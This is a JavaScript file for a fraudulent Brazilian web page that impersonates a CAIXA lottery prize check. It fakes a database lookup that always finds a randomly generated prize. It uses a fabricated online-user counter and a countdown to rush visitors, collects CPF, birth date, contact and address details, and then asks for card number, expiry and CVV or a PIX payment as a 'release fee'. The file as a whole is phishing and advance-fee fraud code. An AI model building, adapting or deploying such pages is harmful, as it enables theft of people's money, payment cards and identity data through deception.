// Variáveis globais
let currentStep = 1;
let premioData = {};
let countdown;

// Inicialização
document.addEventListener('DOMContentLoaded', function() {
    initializeCounters();
    setupEventListeners();
    generatePremioData();
});

// Configurar event listeners
function setupEventListeners() {
    // Formulário de consulta
    document.getElementById('consultaForm').addEventListener('submit', handleConsulta);
    
    // Formulário de identidade
    document.getElementById('identidadeForm').addEventListener('submit', handleIdentidade);
    
    // Formulário de cartão
    document.getElementById('cartaoForm').addEventListener('submit', handleCartao);
    
    // Máscaras de input
    setupInputMasks();
}

// Configurar máscaras de input
function setupInputMasks() {
    // Máscara CPF
    const cpfInput = document.getElementById('cpf');
    cpfInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        e.target.value = value;
    });
    
    // Máscara telefone
    const telefoneInput = document.getElementById('telefone');
    telefoneInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{2})(\d)/, '($1) $2');
        value = value.replace(/(\d{5})(\d)/, '$1-$2');
        e.target.value = value;
    });
    
    // Máscara CEP
    const cepInput = document.getElementById('cep');
    cepInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{5})(\d)/, '$1-$2');
        e.target.value = value;
    });
    
    // Máscara cartão
    const cartaoInput = document.getElementById('numero-cartao');
    if (cartaoInput) {
        cartaoInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(\d)/, '$1 $2');
            value = value.replace(/(\d{4})(\d)/, '$1 $2');
            value = value.replace(/(\d{4})(\d)/, '$1 $2');
            e.target.value = value;
        });
    }
    
    // Máscara validade
    const validadeInput = document.getElementById('validade');
    if (validadeInput) {
        validadeInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{2})(\d)/, '$1/$2');
            e.target.value = value;
        });
    }
}

// Inicializar contadores
function initializeCounters() {
    // Contador de pessoas online
    const onlineCounter = document.getElementById('online-counter');
    let count = 1234;
    
    setInterval(() => {
        count += Math.floor(Math.random() * 10) - 5;
        if (count < 1000) count = 1000;
        if (count > 2000) count = 2000;
        onlineCounter.textContent = count.toLocaleString();
    }, 3000);
}

// Gerar dados do prêmio
function generatePremioData() {
    const valores = [8500, 12000, 15000, 18500, 25000];
    const valor = valores[Math.floor(Math.random() * valores.length)];
    
    premioData = {
        valor: valor,
        valorFormatado: `R$ ${valor.toLocaleString('pt-BR')},00`,
        taxa: Math.floor(valor * 0.01),
        taxaFormatada: `R$ ${Math.floor(valor * 0.01)},00`,
        valorFinal: valor - Math.floor(valor * 0.01),
        valorFinalFormatado: `R$ ${(valor - Math.floor(valor * 0.01)).toLocaleString('pt-BR')},00`,
        data: '15/08/2023',
        cartela: `TLS-2023-${Math.floor(Math.random() * 900000) + 100000}`,
        protocolo: `TLS-2024-${Math.floor(Math.random() * 900000000) + 100000000}`
    };
}

// Validar CPF (simplificado para aceitar qualquer CPF com 11 dígitos)
function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, '');
    return cpf.length === 11 && !/^(\d)\1{10}$/.test(cpf);
}

// Handle consulta
function handleConsulta(e) {
    e.preventDefault();
    
    const cpf = document.getElementById('cpf').value;
    const nascimento = document.getElementById('nascimento').value;
    
    if (!validarCPF(cpf)) {
        alert('CPF inválido. Por favor, verifique os dados informados.');
        return;
    }
    
    if (!nascimento) {
        alert('Por favor, informe sua data de nascimento.');
        return;
    }
    
    // Verificar se a data não é futura
    const hoje = new Date();
    const dataNasc = new Date(nascimento);
    if (dataNasc > hoje) {
        alert('Data de nascimento não pode ser futura.');
        return;
    }
    
    showStep(2);
    simulateLoading();
}

// Simular carregamento
function simulateLoading() {
    const loadingTexts = [
        'Verificando prêmios pendentes em seu CPF...',
        'Consultando base de dados da CAIXA...',
        'Analisando histórico de participações...',
        'Validando informações...',
        'Prêmio encontrado! Preparando detalhes...'
    ];
    
    let currentText = 0;
    const loadingElement = document.getElementById('loading-text');
    
    const textInterval = setInterval(() => {
        if (currentText < loadingTexts.length - 1) {
            currentText++;
            loadingElement.textContent = loadingTexts[currentText];
        }
    }, 600);
    
    setTimeout(() => {
        clearInterval(textInterval);
        showStep(3);
        updatePremioInfo();
        startCountdown();
    }, 3000);
}

// Atualizar informações do prêmio
function updatePremioInfo() {
    document.getElementById('premio-valor').textContent = premioData.valorFormatado;
    document.getElementById('premio-data').textContent = premioData.data;
    document.getElementById('premio-cartela').textContent = premioData.cartela;
}

// Iniciar countdown
function startCountdown() {
    let timeLeft = 24 * 60 * 60 - 15; // 23:59:45
    
    countdown = setInterval(() => {
        const hours = Math.floor(timeLeft / 3600);
        const minutes = Math.floor((timeLeft % 3600) / 60);
        const seconds = timeLeft % 60;
        
        document.getElementById('countdown').textContent = 
            `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        timeLeft--;
        
        if (timeLeft < 0) {
            clearInterval(countdown);
            document.getElementById('countdown').textContent = '00:00:00';
        }
    }, 1000);
}

// Handle identidade
function handleIdentidade(e) {
    e.preventDefault();
    
    const nome = document.getElementById('nome').value;
    const telefone = document.getElementById('telefone').value;
    const email = document.getElementById('email').value;
    const cep = document.getElementById('cep').value;
    const endereco = document.getElementById('endereco').value;
    const cidade = document.getElementById('cidade').value;
    
    if (!nome || !telefone || !email || !cep || !endereco || !cidade) {
        alert('Por favor, preencha todos os campos obrigatórios.');
        return;
    }
    
    // Validar email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert('Por favor, informe um e-mail válido.');
        return;
    }
    
    showStep(5);
    updateTaxaInfo();
}

// Atualizar informações da taxa
function updateTaxaInfo() {
    const premioSummary = document.querySelector('.premio-summary');
    premioSummary.innerHTML = `
        <h3>Resumo do Prêmio</h3>
        <div class="summary-item">
            <span>Valor do Prêmio:</span>
            <span class="value">${premioData.valorFormatado}</span>
        </div>
        <div class="summary-item">
            <span>Taxa de Liberação (1%):</span>
            <span class="value">${premioData.taxaFormatada}</span>
        </div>
        <div class="summary-item total">
            <span>Valor a Receber:</span>
            <span class="value">${premioData.valorFinalFormatado}</span>
        </div>
    `;
}

// Handle cartão
function handleCartao(e) {
    e.preventDefault();
    
    const numeroCartao = document.getElementById('numero-cartao').value;
    const validade = document.getElementById('validade').value;
    const cvv = document.getElementById('cvv').value;
    const nomeCartao = document.getElementById('nome-cartao').value;
    
    if (!numeroCartao || !validade || !cvv || !nomeCartao) {
        alert('Por favor, preencha todos os dados do cartão.');
        return;
    }
    
    // Simular processamento
    const button = e.target.querySelector('button[type="submit"]');
    const originalText = button.innerHTML;
    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
    button.disabled = true;
    
    setTimeout(() => {
        confirmPayment();
    }, 2000);
}

// Selecionar forma de pagamento
function selectPayment(type) {
    // Atualizar tabs
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelector(`[onclick="selectPayment('${type}')"]`).classList.add('active');
    
    // Mostrar conteúdo correspondente
    document.querySelectorAll('.payment-content').forEach(content => content.classList.remove('active'));
    document.getElementById(`${type}-payment`).classList.add('active');
}

// Copiar código PIX
function copyPix() {
    const pixCode = document.querySelector('.pix-code input');
    pixCode.select();
    document.execCommand('copy');
    
    const button = document.querySelector('.pix-code button');
    const originalHTML = button.innerHTML;
    button.innerHTML = '<i class="fas fa-check"></i>';
    button.style.background = '#28a745';
    
    setTimeout(() => {
        button.innerHTML = originalHTML;
        button.style.background = '#228B22';
    }, 2000);
}

// Confirmar pagamento
function confirmPayment() {
    showStep(6);
    updateConfirmationInfo();
}

// Atualizar informações de confirmação
function updateConfirmationInfo() {
    document.getElementById('protocolo').textContent = premioData.protocolo;
    
    // Calcular horário de recebimento (2 horas a partir de agora)
    const agora = new Date();
    const recebimento = new Date(agora.getTime() + 2 * 60 * 60 * 1000);
    const hoje = agora.toDateString() === recebimento.toDateString();
    
    let previsaoTexto;
    if (hoje) {
        previsaoTexto = `Hoje, até ${recebimento.getHours().toString().padStart(2, '0')}:${recebimento.getMinutes().toString().padStart(2, '0')}`;
    } else {
        previsaoTexto = `${recebimento.toLocaleDateString('pt-BR')}, até ${recebimento.getHours().toString().padStart(2, '0')}:${recebimento.getMinutes().toString().padStart(2, '0')}`;
    }
    
    document.getElementById('previsao-recebimento').textContent = previsaoTexto;
    
    // Atualizar valor a receber
    document.querySelector('.confirmation-details .value').textContent = premioData.valorFinalFormatado;
}

// Mostrar etapa
function showStep(stepNumber) {
    // Esconder todas as etapas
    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
    
    // Mostrar etapa atual
    document.getElementById(`step${stepNumber}`).classList.add('active');
    
    currentStep = stepNumber;
    
    // Scroll para o topo
    window.scrollTo(0, 0);
}

// Próxima etapa
function nextStep() {
    if (currentStep < 6) {
        showStep(currentStep + 1);
    }
}

// Função para CEP (simulada)
function buscarCEP() {
    const cep = document.getElementById('cep').value.replace(/\D/g, '');
    
    if (cep.length === 8) {
        // Simular busca de CEP
        setTimeout(() => {
            document.getElementById('endereco').value = 'Rua das Flores, 123';
            document.getElementById('cidade').value = 'São Paulo';
        }, 500);
    }
}

// Event listener para CEP
document.addEventListener('DOMContentLoaded', function() {
    const cepInput = document.getElementById('cep');
    if (cepInput) {
        cepInput.addEventListener('blur', buscarCEP);
    }
});

// Prevenir refresh acidental
window.addEventListener('beforeunload', function(e) {
    if (currentStep > 1 && currentStep < 6) {
        e.preventDefault();
        e.returnValue = '';
    }
});

// Animações de entrada
function animateOnScroll() {
    const elements = document.querySelectorAll('.stat, .testimonial, .form-container');
    
    elements.forEach(element => {
        const elementTop = element.getBoundingClientRect().top;
        const elementVisible = 150;
        
        if (elementTop < window.innerHeight - elementVisible) {
            element.style.opacity = '1';
            element.style.transform = 'translateY(0)';
        }
    });
}

// Inicializar animações
document.addEventListener('DOMContentLoaded', function() {
    // Configurar elementos para animação
    const elements = document.querySelectorAll('.stat, .testimonial, .form-container');
    elements.forEach(element => {
        element.style.opacity = '0';
        element.style.transform = 'translateY(30px)';
        element.style.transition = 'all 0.6s ease';
    });
    
    // Executar animações
    animateOnScroll();
    window.addEventListener('scroll', animateOnScroll);
});

// Efeitos visuais adicionais
document.addEventListener('DOMContentLoaded', function() {
    // Efeito de digitação no loading
    const loadingText = document.getElementById('loading-text');
    if (loadingText) {
        let originalText = loadingText.textContent;
        let index = 0;
        
        function typeWriter() {
            if (index < originalText.length) {
                loadingText.textContent = originalText.substring(0, index + 1);
                index++;
                setTimeout(typeWriter, 50);
            }
        }
    }
    
    // Efeito parallax suave no background
    window.addEventListener('scroll', function() {
        const scrolled = window.pageYOffset;
        const rate = scrolled * -0.5;
        document.body.style.backgroundPosition = `center ${rate}px`;
    });
});

